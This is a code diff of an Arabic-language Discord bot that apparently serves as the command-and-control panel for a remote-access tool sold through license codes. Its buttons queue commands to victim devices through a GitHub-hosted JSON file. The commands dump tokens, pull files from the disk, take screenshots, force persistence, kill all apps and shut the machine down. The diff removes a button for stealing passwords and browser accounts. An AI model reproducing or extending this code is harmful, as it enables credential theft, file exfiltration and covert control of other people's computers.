@@ -13,7 +13,6 @@ from threading import Thread
 
 app = Flask('')
 
-# تم تحديث الرابط هنا ليطابق رابط Railway الجديد الخاص بك
 HOST_URL = "https://3srh-system-data-production.up.railway.app"
 
 WEB_SESSIONS_MEMORY = {}
@@ -178,12 +177,9 @@ REPO_NAME = os.getenv('REPO_NAME', '3srh-system-data')
 FILE_PATH = os.getenv('FILE_PATH', 'licenses.json')
 CHANNEL_ID = int(os.getenv('CHANNEL_ID', 1547705815698382970))
 
-intents = discord.Intents.default()
-intents.message_content = True
-
 class LicenseBot(discord.Client):
     def __init__(self):
-        super().__init__(intents=intents)
+        super().__init__(intents=discord.Intents.default())
         self.tree = app_commands.CommandTree(self)
 
     async def setup_hook(self):
@@ -372,15 +368,7 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_token_stealers", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Tokens Dump {self.code}"): await interaction.followup.send("🔑 تم طلب سحب بيانات توكنات شاملة بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="🔐 سحب كلمات المرور والبريد", style=discord.ButtonStyle.secondary, custom_id="dev_act_passwords", row=1)
-    async def passwords_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
-        if db:
-            db.setdefault("remote_passwords", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Passwords Dump {self.code}"): await interaction.followup.send("🔐 تم طلب سحب كلمات المرور وحسابات المتصفح بنجاح!", ephemeral=True)
-
-    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=2)
+    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=1)
     async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -388,7 +376,7 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_screenshots", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"SS {self.code}"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
 
-    @discord.ui.button(label="📂 سحب الملفات (Disk Dump)", style=discord.ButtonStyle.secondary, custom_id="dev_act_diskdump", row=2)
+    @discord.ui.button(label="📂 سحب الملفات (Disk Dump)", style=discord.ButtonStyle.secondary, custom_id="dev_act_diskdump", row=1)
     async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -396,7 +384,7 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_disk_dumps", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Dump {self.code}"): await interaction.followup.send("📂 تم طلب سحب الملفات!", ephemeral=True)
 
-    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=3)
+    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=2)
     async def lock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -404,7 +392,7 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_lock_states", {})[self.code] = {"locked": True, "id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Lock {self.code}"): await interaction.followup.send("🛡️ تم تفعيل الثبات الإلزامي!", ephemeral=True)
 
-    @discord.ui.button(label="🔓 إلغاء الثبات (إغلاق عادي)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=3)
+    @discord.ui.button(label="🔓 إلغاء الثبات (إغلاق عادي)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=2)
     async def unlock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -412,7 +400,7 @@ class DeviceActionsView(discord.ui.View):
             if "remote_lock_states" in db and self.code in db["remote_lock_states"]: del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Unlock {self.code}"): await interaction.followup.send("🔓 تم إلغاء الثبات!", ephemeral=True)
 
-    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=4)
+    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
     async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -421,7 +409,7 @@ class DeviceActionsView(discord.ui.View):
             if "remote_lock_states" in db and self.code in db["remote_lock_states"]: del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Close {self.code}"): await interaction.followup.send("🛑 تم إطفاء الأداة من الخلفية!", ephemeral=True)
 
-    @discord.ui.button(label="إغلاق جميع البرامج في الخلفية والألعاب", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_all_apps", row=4)
+    @discord.ui.button(label="إغلاق جميع البرامج في الخلفية والألعاب", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_all_apps", row=3)
     async def kill_all_apps_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -430,7 +418,7 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Kill all background apps for {self.code}"): 
                 await interaction.followup.send("🛑 تم إرسال أمر إغلاق كافة البرامج والألعاب في الخلفية (مع استثناء السكربت) بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=5)
+    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -480,17 +468,6 @@ class MainDashboardView(discord.ui.View):
         if not db: return
         devs_list = [(c, info) for c, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
         await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل:**", view=DevicesSubMenuView(devs_list) if devs_list else None, ephemeral=True)
-
-    @discord.ui.button(label="⚡ توليد سريع (Quick Gen)", style=discord.ButtonStyle.success, custom_id="dash_quick_gen", row=1)
-    async def quick_gen_dash(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        code = generate_random_code()
-        db, sha, url, headers = fetch_db()
-        if db:
-            if "codes" not in db: db["codes"] = {}
-            db["codes"][code] = {"used": False, "device": None, "ip": None, "port": None, "country": None}
-            if save_db(db, sha, url, headers, f"Quick generate code {code}"):
-                await interaction.followup.send(f"⚡ **تم توليد وحفظ كود سريع جديد بنجاح!**\n🔑 الكود: `{code}`", ephemeral=True)
 
 @client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
 async def generate(interaction: discord.Interaction, count: int = 1):
